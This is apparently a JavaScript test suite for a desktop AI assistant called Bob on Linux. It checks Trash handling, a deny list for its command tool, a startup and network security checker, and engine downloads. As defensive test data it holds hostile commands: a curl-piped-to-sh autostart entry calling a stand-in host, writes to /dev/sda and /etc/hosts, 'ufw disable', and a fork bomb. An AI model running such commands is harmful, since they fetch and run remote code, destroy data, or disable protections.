// Bob on Linux: the desktop Trash, the Run Hand's Linux rules, and the Security Hand read the Linux way.
// Runs the same on any machine (nothing here needs Linux itself).
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { recycle, forgetTrashInfo, usesBin } from '../src/recycle.js';
import { checkCommand } from '../src/hands-run.js';
import { gatherStartup, gatherNetwork, gatherOverview, sayOverviewLinux, sayStartupLinux, sayNetworkLinux, judgeStartupLinux, clamPlan, sayClam } from '../src/security-linux.js';
import { securityTools } from '../src/hands-security.js';
import { ENGINES, pickAsset, engineFor, liftLibraries, makeRunnable } from '../src/engines.js';
import { onPath } from '../src/platform.js';
import { findExe } from '../src/config.js';
import { packFor, packsFor, suit, pickFor } from '../public/fit.js';
import { starterBrain, readyPlan } from '../public/equip.js';

let pass = 0, fail = 0;
const check = (name, ok, extra) => { if (ok) { pass++; console.log(`PASS ${name}`); } else { fail++; console.log(`FAIL ${name}${extra ? ` (${String(extra).slice(0, 300)})` : ''}`); } };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bob-linux-'));

// ---------- the desktop Trash (freedesktop.org) ----------
{
  const data = path.join(tmp, 'inn', 'bob'); fs.mkdirSync(data, { recursive: true });
  const cfg = { dataDir: data, innDir: path.join(tmp, 'inn'), painterDir: path.join(tmp, 'inn', 'painter'), recycleBin: true, desktopTrashDir: path.join(tmp, 'Trash') };
  // recycle() picks the desktop Trash by the real platform, so on Windows this would reach the real Recycle Bin.
  if (process.platform === 'win32') console.log('SKIP Linux desktop Trash checks (on Windows recycle() uses the real Recycle Bin)');
  else {
    const f = path.join(data, 'old notes #1.txt'); fs.writeFileSync(f, 'x');
    const r = recycle(cfg, [f]);
    const info = path.join(cfg.desktopTrashDir, 'info', 'old notes #1.txt.trashinfo');
    check('Linux: a thrown-away file goes to the desktop Trash', r.gone.length === 1 && !fs.existsSync(f) && fs.existsSync(path.join(cfg.desktopTrashDir, 'files', 'old notes #1.txt')));
    const note = fs.existsSync(info) ? fs.readFileSync(info, 'utf8') : '';
    check('Linux: it leaves a .trashinfo the file manager can restore from', /^\[Trash Info\]\nPath=.*\/old%20notes%20%231\.txt\nDeletionDate=\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\n$/.test(note), note);
    fs.writeFileSync(f, 'y');
    const r2 = recycle(cfg, [f]);
    check('Linux: a second one with the same name gets its own name', r2.trashed[f]?.endsWith('old notes #1.2.txt'));
    fs.renameSync(r2.trashed[f], f); forgetTrashInfo(r2.trashed[f]);
    check('Linux: Undo takes the .trashinfo away too', !fs.existsSync(path.join(cfg.desktopTrashDir, 'info', 'old notes #1.2.txt.trashinfo')) && fs.existsSync(info));
  }
  check('Linux: outside the allowed folders is still refused', recycle(cfg, ['/etc/hostname']).refused.length === 1);
  check('Linux from source (no Electron) keeps Bob\'s own trash folder', usesBin({}, 'linux') === Boolean(process.versions.electron) && usesBin({ recycleBin: false }, 'linux') === false);
}

// ---------- the Run Hand's Linux rules ----------
{
  const cfg = { hands: { enabled: true, run: { on: true } }, readRoots: [tmp], readOnlyRoots: [] };
  const no = (cmd, args, re) => { const r = checkCommand(cfg, { cmd, args, cwd: tmp }); return !r.ok && (!re || re.test(r.why)); };
  const yes = (cmd, args) => checkCommand(cfg, { cmd, args, cwd: tmp }).ok;
  check('Run: sudo, pkexec, doas and su are refused', no('bash', ['-c', 'sudo apt install x'], /administrator/) && no('pkexec', ['ls']) && no('doas', ['ls']) && no('bash', ['-c', 'su - root']));
  check('Run: rm -r and find -delete are refused (the Files Hand throws things away)', no('rm', ['-r', 'build'], /many files/) && no('find', ['.', '-name', '*.o', '-delete']));
  check('Run: writing into /etc or a raw disk is refused', no('bash', ['-c', 'echo x > /etc/hosts'], /system files/) && no('bash', ['-c', 'cat x > /dev/sda'], /raw disks/));
  check('Run: services, cron and the firewall are refused', no('systemctl', ['enable', 'x']) && no('crontab', ['-e']) && no('ufw', ['disable']));
  check('Run: a fork bomb is refused', no('bash', ['-c', ':(){ :|:& };:']));
  check('Run: everyday developer commands still run', yes('ls', ['-la']) && yes('chmod', ['+x', 'run.sh']) && yes('npm', ['test']) && yes('git', ['status']) && yes('rm', ['old.log']));
}

// ---------- the Security Hand, the Linux way ----------
{
  const root = path.join(tmp, 'root'), home = path.join(tmp, 'home');
  const auto = path.join(home, '.config', 'autostart'); fs.mkdirSync(auto, { recursive: true });
  fs.writeFileSync(path.join(auto, 'good.desktop'), '[Desktop Entry]\nName=Syncthing\nExec=/usr/bin/syncthing serve\n');
  fs.writeFileSync(path.join(auto, 'bad.desktop'), '[Desktop Entry]\nName=Updater\nExec=sh -c "curl -s http://x.example/a | sh"\n');
  fs.writeFileSync(path.join(auto, 'off.desktop'), '[Desktop Entry]\nName=Chat\nExec=/usr/bin/chat\nX-GNOME-Autostart-enabled=false\n');
  fs.mkdirSync(path.join(root, 'var/log/apt'), { recursive: true }); fs.writeFileSync(path.join(root, 'var/log/apt/history.log'), '');
  fs.mkdirSync(path.join(root, 'run'), { recursive: true }); fs.writeFileSync(path.join(root, 'run/reboot-required'), '');
  const calls = [];
  const run = async (file, args) => {
    calls.push([file, ...args].join(' '));
    if (file === 'systemctl' && args[0] === 'is-active') return args[1] === 'ufw' ? 'active\n' : 'inactive\n';
    if (file === 'systemctl' && args.includes('list-unit-files')) return 'miner.service enabled enabled\n';
    if (file === 'systemctl' && args.includes('show')) return '/tmp/.x/miner --pool x\n';
    if (file === 'crontab') return '# comment\nMAILTO=me\n@reboot /home/sam/backup.sh\n';
    if (file === 'ss') return 'LISTEN 0 4096 127.0.0.1:7777 0.0.0.0:* users:(("bob",pid=42,fd=3))\nLISTEN 0 128 0.0.0.0:22 0.0.0.0:*\nLISTEN 0 128 [::]:631 [::]:*\n';
    return '';
  };
  const env = { HOME: home, XDG_CONFIG_HOME: path.join(home, '.config') };
  const st = await gatherStartup({ env, run, home, root });
  const text = sayStartupLinux(st);
  check('startup: autostart files, user services and crontab are all listed', st.items.length === 5, JSON.stringify(st.items));
  check('startup: curl piped into sh is the worst mark', /^⛔ Updater/m.test(text));
  check('startup: a service running from /tmp is flagged', /⚠ miner\.service[^\n]*temporary/.test(text));
  check('startup: one switched off in the desktop settings says so', /Chat \(switched off\)/.test(text));
  check('startup: Bob says where to switch them off and that he only looks', /Startup Applications/.test(text) && /only looks/.test(text));
  const net = sayNetworkLinux(await gatherNetwork({ run }));
  check('network: ss is read (Bob on 7777 is local; SSH open to the network is flagged)', /1 only reachable[^\n]*7777 bob/.test(net) && /Remote sign-in is open: 22/.test(net), net);
  const ov = sayOverviewLinux(await gatherOverview({ env: { BOB_CLAMSCAN: '' }, run, root }));
  check('overview: no antivirus is explained as normal on Linux, not a scare', /No antivirus is installed\. That is normal on Linux/.test(ov) || /ClamAV is installed/.test(ov), ov);
  check('overview: firewall, last update and a waiting restart are read', /firewall is running \(ufw\)/.test(ov) && /Last system update: today/.test(ov) && /waiting for a restart/.test(ov), ov);
  check('nothing it runs needs sudo or changes anything', calls.every((c) => !/sudo|enable |disable |start |stop /.test(c.replace('--state=enabled', ''))), calls.join(' | '));
  check('a normal autostart program looks normal', judgeStartupLinux({ command: '/usr/bin/syncthing serve' }).level === 0);

  const fakeClam = path.join(tmp, 'clamscan'); fs.writeFileSync(fakeClam, '');
  let ran = null;
  const brain = { cfg: { hands: { enabled: true, security: { on: true } }, readRoots: [tmp], readOnlyRoots: [] }, log() {} };
  const t = securityTools(brain, { os_: 'linux', env: { ...env, BOB_CLAMSCAN: fakeClam }, linux: { run, home, root, clam: async (k, target) => { ran = { k, target }; return { code: 1, out: `${target}/x.exe: Win.Trojan.Agent FOUND\n` }; } } });
  check('Linux: the scan tool talks about ClamAV, not Defender', /ClamAV/.test(t.defender_scan.schema.function?.description || JSON.stringify(t.defender_scan.schema)) && !/Microsoft Defender scan/.test(JSON.stringify(t.defender_scan.schema)));
  const card = t.defender_scan.check({ kind: 'file', path: tmp });
  check('Linux: a scan shows a card with the exact clamscan command', /Scan with ClamAV \(just this\)/.test(card.text) && card.command === `clamscan --recursive --infected --no-summary ${tmp}`);
  const r = await t.defender_scan.run({ kind: 'file', path: tmp }, {});
  check('Linux: what ClamAV finds is reported, and nothing is moved', ran?.k === 'file' && /found 1 thing/.test(r) && /nothing was moved/.test(r));
  check('Linux: full and update scans explain they need administrator rights', (() => { try { clamPlan('update'); return false; } catch (e) { return /administrator/.test(e.message); } })() && (() => { try { clamPlan('full'); return false; } catch (e) { return /administrator/.test(e.message); } })());
  const noClam = securityTools(brain, { os_: 'linux', env: { ...env, BOB_CLAMSCAN: '' } });
  check('Linux: no ClamAV says how to get it', process.platform !== 'linux' || fs.existsSync('/usr/bin/clamscan') || (() => { try { noClam.defender_scan.check({ kind: 'quick' }); return false; } catch (e) { return /software centre/.test(e.message); } })());
  check('Linux: security_check answers the Linux way', /things start when you sign in/.test(await t.security_check.run({ area: 'startup' }, {})) && /no antivirus history/.test(await t.security_check.run({ area: 'threats' }, {})));
  check('clean ClamAV result says so', /found nothing/.test(sayClam('quick', { code: 0, out: '' })));
}

// ---------- engines: the Linux files from each release ----------
{
  // x86_64 PCs; ARM boards are checked below (said outright, so the same checks pass on an ARM computer).
  const side = (id) => engineFor(ENGINES.find((e) => e.id === id), 'linux', 'x64');
  const llama = ['llama-b7000-bin-ubuntu-cuda-12.8-x64.tar.gz', 'llama-b7000-bin-ubuntu-cuda-13.4-x64.tar.gz', 'llama-b7000-bin-ubuntu-cuda-13.4-arm64.tar.gz', 'cudart-llama-b7000-bin-ubuntu-cuda-13.4-x64.tar.gz', 'llama-b7000-bin-win-cuda-13.1-x64.zip', 'llama-b7000-bin-win-vulkan-x64.zip', 'llama-b7000-bin-macos-arm64.tar.gz', 'llama-b7000-bin-ubuntu-x64.tar.gz', 'llama-b7000-bin-ubuntu-vulkan-x64.tar.gz', 'llama-b7000-bin-ubuntu-s390x.tar.gz'].map((name) => ({ name }));
  const L = side('llamacpp'), cuda = pickAsset(llama, L, true);
  check('engines: llama.cpp on Linux with an NVIDIA card takes the newest Ubuntu CUDA build (x64, not arm64)', cuda?.name === 'llama-b7000-bin-ubuntu-cuda-13.4-x64.tar.gz', cuda?.name);
  check('engines: and the CUDA runtime file that goes with it', llama.filter((a) => L.runtime(cuda.name)?.test(a.name)).map((a) => a.name).join() === 'cudart-llama-b7000-bin-ubuntu-cuda-13.4-x64.tar.gz');
  check('engines: other cards take the Vulkan build; NVIDIA falls back to it when there is no CUDA one', pickAsset(llama, L, false).name === 'llama-b7000-bin-ubuntu-vulkan-x64.tar.gz' && pickAsset(llama.filter((a) => !/cuda/.test(a.name)), L, true).name === 'llama-b7000-bin-ubuntu-vulkan-x64.tar.gz');
  check('engines: llama.cpp falls back to the processor build, and older .zip names still match', pickAsset(llama.filter((a) => !/vulkan|cuda/.test(a.name)), L, false).name === 'llama-b7000-bin-ubuntu-x64.tar.gz' && pickAsset([{ name: 'llama-b5000-bin-ubuntu-vulkan-x64.zip' }], L, true));
  const sd = ['sd-master-abc1234-bin-win-cuda12-x64.zip', 'sd-master-abc1234-bin-Linux-Ubuntu-24.04-x86_64.zip', 'sd-master-abc1234-bin-Linux-Ubuntu-24.04-x86_64-vulkan.zip', 'sd-master-abc1234-bin-Linux-Ubuntu-24.04-x86_64-rocm-7.0.zip', 'sd-master-abc1234-bin-Darwin-macOS-15-arm64.zip'].map((name) => ({ name }));
  check('engines: stable-diffusion.cpp on Linux takes the Vulkan build on any card, else the plain one', pickAsset(sd, side('sdcpp'), true).name.endsWith('x86_64-vulkan.zip') && pickAsset(sd, side('sdcpp'), false).name.endsWith('x86_64-vulkan.zip') && pickAsset(sd.filter((a) => !/vulkan/.test(a.name)), side('sdcpp'), false).name.endsWith('24.04-x86_64.zip'));
  check('engines: a Windows file is never picked on Linux', !pickAsset([{ name: 'llama-b7000-bin-win-vulkan-x64.zip' }], L, true) && !pickAsset([{ name: 'uv-x86_64-pc-windows-msvc.zip' }], side('audio'), false));
  check('engines: uv, Piper and whisper.cpp have Linux files', pickAsset([{ name: 'uv-x86_64-unknown-linux-gnu.tar.gz' }], side('audio'), false) && pickAsset([{ name: 'piper_linux_x86_64.tar.gz' }], side('piper'), false) && pickAsset([{ name: 'whisper-bin-ubuntu-arm64.tar.gz' }, { name: 'whisper-bin-ubuntu-x64.tar.gz' }], side('whispercpp'), true)?.name === 'whisper-bin-ubuntu-x64.tar.gz');
  check('engines: the Linux Piper file has its own pinned checksum and release, never the Windows one', /^[0-9a-f]{64}$/.test(side('piper').sha256) && side('piper').sha256 !== ENGINES.find((e) => e.id === 'piper').sha256 && side('piper').tag === '2023.11.14-2');
  check('engines: FFmpeg and LibreOffice come from the distro, with how to get them', ['ffmpeg', 'libreoffice'].every((id) => /software centre/.test(side(id).unavailable || '')));
  check('engines: every engine has a Linux side or a reason', ENGINES.every((e) => e.linux), ENGINES.filter((e) => !e.linux).map((e) => e.id).join(', '));
  check('engines: Linux program names have no .exe', L.exe === 'llama-server' && side('sdcpp').aka.includes('sd'));

  // A zip doesn't keep the "may run" mark; the CUDA runtime may keep its libraries in a subfolder.
  const into = path.join(tmp, 'llama.cpp'); fs.mkdirSync(path.join(into, 'cuda-libs'), { recursive: true });
  fs.writeFileSync(path.join(into, 'llama-server'), '#!/bin/sh\n'); fs.writeFileSync(path.join(into, 'libggml-cuda.so'), 'x'); fs.writeFileSync(path.join(into, 'cuda-libs', 'libcudart.so.13'), 'x');
  liftLibraries(into); makeRunnable(into);
  check('engines: CUDA runtime libraries end up next to llama-server', fs.existsSync(path.join(into, 'libcudart.so.13')));
  check('engines: the program and its libraries can run after unpacking', process.platform === 'win32' || ((fs.statSync(path.join(into, 'llama-server')).mode & 0o111) && (fs.statSync(path.join(into, 'libcudart.so.13')).mode & 0o111)));
  const deep = path.join(tmp, 'deep', 'build', 'bin'); fs.mkdirSync(deep, { recursive: true }); fs.writeFileSync(path.join(deep, 'llama-server'), '');
  check('config: Linux finds llama-server (no .exe) in build/bin', findExe('', path.join(tmp, 'deep'), ['llama-server']) === path.join(deep, 'llama-server'));
  const pathDir = path.join(tmp, 'usr-bin'); fs.mkdirSync(pathDir); fs.writeFileSync(path.join(pathDir, 'whisper-cli'), ''); fs.chmodSync(path.join(pathDir, 'whisper-cli'), 0o755);
  check('engines: one the distro installed is found on the PATH', process.platform === 'win32' || onPath('whisper-cli', { PATH: pathDir }) === path.join(pathDir, 'whisper-cli'));
}

// ---------- ARM Linux (Raspberry Pi 5 and other 64-bit ARM boards) ----------
{
  const arm = (id) => engineFor(ENGINES.find((e) => e.id === id), 'linux', 'arm64');
  const llama = ['llama-b12032-bin-ubuntu-x64.tar.gz', 'llama-b12032-bin-ubuntu-vulkan-x64.tar.gz', 'llama-b12032-bin-ubuntu-arm64.tar.gz', 'llama-b12032-bin-ubuntu-vulkan-arm64.tar.gz', 'llama-b12032-bin-ubuntu-cuda-13.4-arm64.tar.gz', 'llama-b12032-bin-linux-arm64-snapdragon.tar.gz', 'llama-b12032-bin-macos-arm64.tar.gz'].map((name) => ({ name }));
  const L = arm('llamacpp');
  check('ARM: llama.cpp takes the Ubuntu ARM processor build, with or without an NVIDIA card', pickAsset(llama, L, false)?.name === 'llama-b12032-bin-ubuntu-arm64.tar.gz' && pickAsset(llama, L, true)?.name === 'llama-b12032-bin-ubuntu-arm64.tar.gz');
  check('ARM: never an x86_64, Mac or Snapdragon file', !pickAsset(llama.filter((a) => !/ubuntu-arm64/.test(a.name)), L, false));
  check('ARM: llama.cpp is pinned to the tested release, like on a PC', L.tested === ENGINES.find((e) => e.id === 'llamacpp').tested && /^b\d+$/.test(L.tested));
  check('ARM: x86_64 Linux keeps its own picks', pickAsset(llama, engineFor(ENGINES.find((e) => e.id === 'llamacpp'), 'linux', 'x64'), false)?.name === 'llama-b12032-bin-ubuntu-vulkan-x64.tar.gz');
  check('ARM: whisper.cpp and uv take their ARM files', pickAsset([{ name: 'whisper-bin-ubuntu-x64.tar.gz' }, { name: 'whisper-bin-ubuntu-arm64.tar.gz' }], arm('whispercpp'), false)?.name === 'whisper-bin-ubuntu-arm64.tar.gz' && ['audio', 'kokoro', 'chatterbox', 'uv'].every((id) => pickAsset([{ name: 'uv-x86_64-unknown-linux-gnu.tar.gz' }, { name: 'uv-aarch64-unknown-linux-gnu.tar.gz' }], arm(id), false)?.name === 'uv-aarch64-unknown-linux-gnu.tar.gz'));
  check('ARM: no picture engine, with the reason', /ARM Linux/.test(arm('sdcpp').unavailable || ''));
  check('ARM: Piper is the aarch64 file, never the x86_64 checksum', pickAsset([{ name: 'piper_linux_x86_64.tar.gz' }, { name: 'piper_linux_aarch64.tar.gz' }], arm('piper'), false)?.name === 'piper_linux_aarch64.tar.gz' && arm('piper').sha256 !== engineFor(ENGINES.find((e) => e.id === 'piper'), 'linux', 'x64').sha256 && (arm('piper').sha256 ? /^[0-9a-f]{64}$/.test(arm('piper').sha256) : /Kokoro/.test(arm('piper').unavailable)));
  check('ARM: FFmpeg and LibreOffice still come from the distro', ['ffmpeg', 'libreoffice'].every((id) => /software centre/.test(arm(id).unavailable || '')));
  check('ARM: program names have no .exe', L.exe === 'llama-server' && arm('whispercpp').exe === 'whisper-cli');

  const catalog = JSON.parse(fs.readFileSync(new URL('../catalog.json', import.meta.url), 'utf8'));
  const packs = catalog.packs, models = catalog.models.map((m) => ({ ...m, status: { state: 'missing' } }));
  check('ARM sets: a 4 GB board gets Qwen3.5 2B, an 8 GB or 16 GB board Gemma 4 E2B', packFor(packs, 0, false, { arm: true, ramGB: 4 }).id === 'pi4' && packFor(packs, 0, false, { arm: true, ramGB: 8 }).id === 'pi8' && packFor(packs, 0, false, { arm: true, ramGB: 16 }).id === 'pi8');
  check('ARM sets: their brains are on the processor and in the Brain slot', packs.find((p) => p.id === 'pi4').slots['qwen3.5-2b'].includes('bob') && packs.find((p) => p.id === 'pi8').slots['gemma4-e2b'].includes('bob'));
  check('ARM sets: nothing in them needs a graphics card or the picture engine', packsFor(packs, true).every((p) => p.models.every((id) => { const m = catalog.models.find((x) => x.id === id); return m && (m.vramGB || 0) <= 4 && m.needs !== 'stable-diffusion.cpp' && m.commercial === true; })));
  check('ARM sets never show on a PC, and PC sets never on a board', packsFor(packs, false).every((p) => !p.arm) && packsFor(packs, true).every((p) => p.arm) && packFor(packs, 0).id === 'cpu' && packFor(packs, 16).id === 'big');
  check('ARM: one-click first start fetches Qwen3.5 2B on 4 GB, Gemma 4 E2B on 8 GB', starterBrain({ arm: true, ramGB: 4 }) === 'qwen3.5-2b' && starterBrain({ arm: true, ramGB: 8 }) === 'gemma4-e2b' && starterBrain({ vramGB: 0, ramGB: 8 }) === 'gemma4-e2b');
  const engines = [{ id: 'llamacpp', available: true, installed: true, bundled: true }, { id: 'sdcpp', available: false, installed: false }, { id: 'whispercpp', available: true, installed: false }];
  const rp = readyPlan({ arm: true, ramGB: 4, nvidia: false }, models, engines);
  check('ARM: Get Bob ready skips the picture engine and keeps the bundled llama.cpp', rp.ids.join() === 'engine:whispercpp,qwen3.5-2b', rp.ids.join());
  check('ARM: a brain too big for the board doesn\'t suit it', suit(catalog.models.find((m) => m.id === 'gemma4-e4b'), { vramGB: 0, ramGB: 4, arm: true }).level === 'no' && suit(catalog.models.find((m) => m.id === 'qwen3.5-2b'), { vramGB: 0, ramGB: 4, arm: true }).level === 'ok');
  const ctx = { vramGB: 0, ramGB: 4, arm: true, packs };
  check('ARM: Bob\'s picks on a 4 GB board are the set\'s, not the big PC brains', pickFor('bob', models, ctx)?.id === 'qwen3.5-2b' && pickFor('eyes', models, ctx)?.id === 'qwen3.5-2b' && pickFor('deep', models, ctx) === null);
}

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
